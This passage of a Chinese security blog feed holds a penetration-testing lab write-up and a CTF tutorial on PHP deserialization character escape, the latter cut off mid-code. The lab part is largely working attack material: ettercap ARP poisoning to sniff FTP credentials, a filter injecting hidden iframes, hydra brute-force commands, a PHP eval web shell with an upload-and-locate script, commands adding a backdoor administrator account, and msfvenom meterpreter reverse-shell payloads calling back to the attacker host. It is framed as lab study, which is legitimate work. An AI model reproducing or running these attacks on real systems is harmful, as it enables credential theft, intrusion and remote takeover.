        <content type="html"><![CDATA[<p>实验的网络拓扑结构：kali是攻击机，另外两台是靶机</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583827591679.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583827763195.png" alt></p><h2 id="任务一-使用nmap-ettercap进行网络侦查和密码嗅探"><a href="#任务一-使用nmap-ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务一  使用nmap,ettercap进行网络侦查和密码嗅探"></a>任务一  使用nmap,ettercap进行网络侦查和密码嗅探</h2><p>ettercap使用</p><p>常用参数</p><ul><li>-l 显示可用网卡</li><li>-i 选择网卡</li><li>-t 协议选择，tcp/udp/all</li><li>-p 不进行毒化攻击，只用来嗅探</li><li>-F 载入过滤器文件</li><li>-V text 将数据包以文本形式显示在屏幕上</li></ul><p><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</p><p>具体到这个实验，需要使用ettercap去捕获ftp登陆的用户名和口令。其中，192.168.1.3 开放了ftp端口，所以尝试多次之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth1 -Tq -L sniffeddata -M arp:remote &#x2F;&#x2F;192.168.1.3&#x2F;21&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/ea51772/Image.png" alt></p><p>然后就抓到密码了</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/Image-1583392370959.png" alt></p><p>ettercap过滤脚本学习：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; ip.dst !&#x3D; &#39;192.1.1.200&#39; &amp;&amp; tcp.dst &#x3D;&#x3D; 80 || tcp.dst &#x3D;&#x3D; 8080) &#123; </span><br><span class="line">     #...and if it contains an Accept-Encoding header... </span><br><span class="line">     if (search(DATA.data, &quot;Accept-Encoding&quot;)) &#123; </span><br><span class="line">     #...remove any Encoding (make sure we are using plain text) </span><br><span class="line">     replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing!&quot;);   </span><br><span class="line">     &#125;   </span><br><span class="line"> &#125;   </span><br><span class="line"> #--Inject Iframe--   </span><br><span class="line"> if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; ip.dst !&#x3D; &#39;192.1.1.200&#39; &amp;&amp; tcp.src &#x3D;&#x3D; 80 || tcp.src &#x3D;&#x3D; 8080) &#123;   </span><br><span class="line">    if (search(DATA.data, &quot;&lt;body&gt;&quot;))&#123;   </span><br><span class="line">        #Replace it with the body tag and an iframe to our attacking webpage   </span><br><span class="line">        replace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&lt;iframe src&#x3D;&#39;http:&#x2F;&#x2F;192.1.1.200&#39; width&#x3D;0 height&#x3D;0 &#x2F;&gt;&quot;);   </span><br><span class="line">        msg(&quot;iframe injected after &lt;body&gt;\n&quot;);   </span><br><span class="line">    &#125;   </span><br><span class="line">    if (search(DATA.data, &quot;&lt;BODY&gt;&quot;))&#123;   </span><br><span class="line">        replace(&quot;&lt;BODY&gt;&quot;,&quot;&lt;BODY&gt;&lt;IFRAME SRC&#x3D;&#39;http:&#x2F;&#x2F;192.1.1.200&#39; width&#x3D;0 height&#x3D;0 &#x2F;&gt;&quot;);   </span><br><span class="line">        msg(&quot;iframe injected after &lt;BODY&gt;\n&quot;);   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。</BODY></body></p><p>基本语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。</span><br><span class="line">编译过滤规则的命令是：</span><br><span class="line">etterfilter filter.ecf -o filter.ef。</span><br><span class="line">即把filter.ecf文件编译成ettercap能识别的filter.ef文件。</span><br><span class="line">过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号&#123;&#125;不能省略。</span><br><span class="line">Ettercap提供的一些常用的函数有：</span><br><span class="line">search(where, what) 从字符串where中查找what，若找到则返回true</span><br><span class="line">regex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回true</span><br><span class="line">replace(what, with) 把字符串what替换成字符串with</span><br><span class="line">log(what, where) 把字符串what记录到where文件中</span><br><span class="line">msg(message) 在屏幕上显示出字符串message</span><br><span class="line">exit() 退出</span><br></pre></td></tr></table></figure><p>（当然这里不用这么复杂啦</p><h2 id="任务二-使用crunch，hydra暴力破解ssh服务"><a href="#任务二-使用crunch，hydra暴力破解ssh服务" class="headerlink" title="任务二 使用crunch，hydra暴力破解ssh服务"></a>任务二 使用crunch，hydra暴力破解ssh服务</h2><p>crunch的基本用法</p><p>*　　-b #体积大小，比如后跟20mib<br>*　　-c #密码个数（行数），比如8000<br>*　　-d #限制出现相同元素的个数（即至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的<br>*　　-e #定义停止生成密码 ，比如-e 222222：到222222停止生成密码<br>*　　-f #调用密码库文件，比如/usr/share/crunch/charset.lst<br>*　　-i #改变输出格式<br>*　　-l #与-t搭配使用<br>*　　-m #与-p搭配使用<br>*　　-o #保存为<br>*　　-p #定义密码元素<br>*　　-q #读取字典<br>*　　-r #定义从某一个地方重新开始<br>*　　-s #第一个密码，从xxx开始<br>*　　-t #定义输出格式</p><p>hydra爆破的用法</p><ul><li>破解ssh</li></ul><p><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</code></p><ul><li>破解ftp</li></ul><p><code>hydra ip ftp -l 用户名 -P 密码字典 -t线程(默认16) -vV</code></p><ul><li>破解rdp</li></ul><p><code>hydra ip rdp -l administrator -P pass.txt -V</code></p><ul><li>破解telnet</li></ul><p><code>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</code></p><p>当然这里我们直接社工吧。。hacker123</p><h2 id="任务三-使用ssh登陆"><a href="#任务三-使用ssh登陆" class="headerlink" title="任务三 使用ssh登陆"></a>任务三 使用ssh登陆</h2><p>不说了。。ssh命令了解一下即可</p><h2 id="任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息</h2><p>这是exponent cms的漏洞，百度就知道了</p><p><a href="https://www.anquanke.com/post/id/84514" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84514</a></p><p>简单来说就是对上传没做过滤可以任意文件上传，但是上传之后就会被删掉</p><p>(看上去挺安全的，其实23333，引狼入室犯了安全大忌)</p><p>在判断的时候，可以通过修改参数来实现绕过删除</p><p>绕过删除之后，由于文件被重命名了，所以需要爆破一下文件名，使用脚本能够比较方便的完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_url=<span class="string">'http://192.168.1.4/'</span></span><br><span class="line">url_for_time=<span class="string">'index.php?module=eventregistration&amp;action=eventsCalendar'</span></span><br><span class="line">url_for_upload=<span class="string">'index.php?module=eventregistration&amp;action=emailRegistrants&amp;email_addresses=123456789@123.com&amp;email_message=1&amp;email_subject=1'</span></span><br><span class="line"></span><br><span class="line">files=&#123;<span class="string">'attach'</span>:open(<span class="string">'index.php'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line">requests.post(base_url+url_for_upload,files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'upload finish'</span></span><br><span class="line"></span><br><span class="line">r=requests.get(base_url+url_for_time)</span><br><span class="line">html1=r.content</span><br><span class="line"><span class="comment">#print html1</span></span><br><span class="line">index=r.content.find(<span class="string">'History.pushState'</span>)</span><br><span class="line"><span class="keyword">if</span> index:</span><br><span class="line">    time=html1[index:index+<span class="number">60</span>].split(<span class="string">'rel'</span>)[<span class="number">1</span>].split(<span class="string">'\''</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'something wrong'</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"get time:"</span>+ time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(time),int(time)<span class="number">-20</span>,<span class="number">-1</span>):</span><br><span class="line">    shell_url=base_url+<span class="string">'tmp/'</span>+str(i)+<span class="string">'_index.php'</span></span><br><span class="line">    r2=requests.get(shell_url)</span><br><span class="line">    <span class="keyword">if</span> r2.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"shell is here : "</span>+shell_url</span><br></pre></td></tr></table></figure><p>准备一个index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@simpleedu:~<span class="comment"># cat index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>($_REQUEST[cmd]);</span><br><span class="line">phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(为了验证上传成功，多加个phpinfo())</p><p>自动上传，爆破得到文件名</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583828526162.png" alt></p><p>然后就是添加用户，将用户添加到用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hacker Beijing123 &#x2F;add</span><br><span class="line">net localgroup administrators hacker &#x2F;add</span><br></pre></td></tr></table></figure><p>看一下端口开放情况</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583828518473.png" alt></p><p>这里。。比较坑的就是远程桌面并不是3389，而是。。。35155</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.1.4:35155</span><br></pre></td></tr></table></figure><p>连接之后即可，发现 <code>2.key</code> 文件，给它添加一个用户即可</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583828819591.png" alt></p><p>太卡了就不演示了</p><h2 id="ps-使用metasploit做法"><a href="#ps-使用metasploit做法" class="headerlink" title="ps 使用metasploit做法"></a>ps 使用metasploit做法</h2><p>一开始由于找不到图形界面，所以只能用命令行去刚。最后还是屈服了(GUI真香)</p><p>msfvenom生成php马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.2 lport&#x3D;4444 -f raw  -o index.php</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583829091269.png" alt="成功弹到shell"></p><p>然而美中不足的是权限不够，所以需要再生成一个Windows的木马反弹一次。。</p><p>重新开始监听，换一个payload</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583829313717.png" alt></p><p>msfvenom 生成shell.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.2 lport&#x3D;4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>传一下shell.exe</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583829335497.png" alt="1583829335497"></p><p>执行，成功反弹</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583829371796.png" alt></p><p>当然这样也能获得管理员权限，但是还是没法读文件</p><p><img src= "/img/loading.gif" data-src="/posts/ea51772/1583829406417.png" alt></p><p>也就是记录一下msf的强大</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化导致字符的逃逸</title>
      <link href="/posts/bdd52bdc/"/>
      <url>/posts/bdd52bdc/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></p><p>这个点很神奇，</p><h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/x/'</span>,<span class="string">'yy'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"peri0d"</span>;</span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"></span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure><p>这里将 <code>x</code> 替换为 <code>yy</code>,也就是变长了，正常的序列化数据为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</span><br></pre></td></tr></table></figure><p>如果我们可以控制用户名去修改密码，那么应该是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</span><br></pre></td></tr></table></figure><p>(尤其注意这里的双引号)</p><p><code>peri0d</code> 长度为6，<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 长度为20</p><p>x替换为yy，长度由原来的1变为2，那么我们这里设填充为z,满足</p><p>6+20+z = 6+2z，得到的z就是20，所以填充x为20即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$username = <span class="string">"peri0d"</span>;</span><br><span class="line">$payload = <span class="string">'";i:1;s:6:"123456";&#125;'</span>;</span><br><span class="line">$x = str_repeat(<span class="string">"x"</span>,<span class="number">20</span>);</span><br><span class="line">$username = $username.$x.$payload;</span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"></span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;a:2:&#123;i:0;s:46:&quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0] &#x3D;&gt;</span><br><span class="line">  string(46) &quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;</span><br><span class="line">  [1] &#x3D;&gt;</span><br><span class="line">  string(6) &quot;123456&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2><p>安洵杯 easy_serialize_php</p><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag 在 <code>d0g3_f1ag.php</code> 这个文件中</p><p><code>$_SESSION</code> 数组中有 <code>user, funciton, img</code> 这三个属性</p><p>最后读文件的文件名是 <code>$_SESSION[&#39;img&#39;]</code> ，如果能够控制这个属性就好了，但是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然 <code>sha1</code> 的数据你是没法控制的，那怎么搞呢</p><p>重点在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure><p>序列化之后经过了一次过滤</p><p>而 <code>extract($_POST);</code> 使得我们可以控制 <code>$_SESSION</code> 数组中的 <code>user</code> 和 <code>function</code></p><p>先测试一下正常的一段序列化字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>能不能控制好user和function，使得加上一个我们控制好的img</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo&#x3D;&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;&#125;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这样反序列化的时候最后的那个 img属性就是多余的了，我们来计算一下怎么利用过滤来达到目的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = <span class="string">'2333'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocAo=";s:2:"dd";s:3:"aaa";&#125;'</span>;</span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = <span class="string">'Z3Vlc3RfaW1nLnBuZwo='</span>;</span><br><span class="line"></span><br><span class="line">$a = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($_SESSION)));</span><br><span class="line"><span class="comment">// var_dump(unserialize($a));</span></span><br></pre></td></tr></table></figure><p>此时生成的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;2333&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo&#x3D;&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们要让 <code>&quot;;s:8:&quot;function&quot;;s:61:&quot;a</code> 这段字符被吃掉，成为 <code>user</code> 的值，算一下长度24，正好是6个flag</p><p>所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = <span class="string">'flagflagflagflagflagflag'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocAo=";s:2:"dd";s:3:"aaa";&#125;'</span>;</span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = <span class="string">'Z3Vlc3RfaW1nLnBuZwo='</span>;</span><br><span class="line"></span><br><span class="line">$a = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($_SESSION)));</span><br><span class="line">var_dump(unserialize($a));</span><br></pre></td></tr></table></figure><p>这时候得到的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">61</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocAo="</span>;s:<span class="number">2</span>:<span class="string">"dd"</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:20:"</span>Z3Vlc3RfaW1nLnBuZwo=<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>再进行反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 